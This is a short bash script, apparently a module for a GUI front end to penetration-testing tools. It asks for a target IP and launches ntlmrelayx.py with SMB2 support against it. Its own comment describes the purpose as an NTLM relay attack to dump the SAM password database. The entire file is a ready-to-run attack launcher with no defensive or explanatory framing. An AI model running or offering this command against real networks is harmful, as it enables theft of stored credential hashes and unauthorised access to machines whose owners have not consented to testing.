#!/bin/bash

: '
ntlmrelayx: NTLM relayx attack, dump sam database
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
TARGET_IP_FIELD=$(form_item "target ip" "target_ip")

# Generate GUI form
generate_form "${TARGET_IP_FIELD}"

TARGET_IP=${form_data["target_ip"]}

execute_command "ntlmrelayx.py --no-http-server -smb2support -t ${TARGET_IP}"
create_new_line
